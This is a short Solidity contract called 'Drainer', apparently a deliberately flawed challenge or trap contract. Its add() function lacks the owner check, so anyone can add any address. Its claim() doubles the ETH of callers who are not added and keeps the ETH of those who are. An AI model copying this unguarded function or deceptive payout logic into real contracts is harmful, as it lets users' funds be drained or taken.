// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract Drainer {
    mapping(address => bool) allowed;
    address owner;

    constructor() payable {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    function add(address user) external {
        allowed[user] = true;
    }

    function claim() external payable {
        if (!allowed[msg.sender]) {
            // send back doubled amount of eth sent
            payable(msg.sender).transfer(msg.value * 2);
        } else {
            // do nothing, dont send back eth
        }
    }

    function withdraw(uint256 amount) external onlyOwner {
        payable(msg.sender).transfer(amount);
    }
}
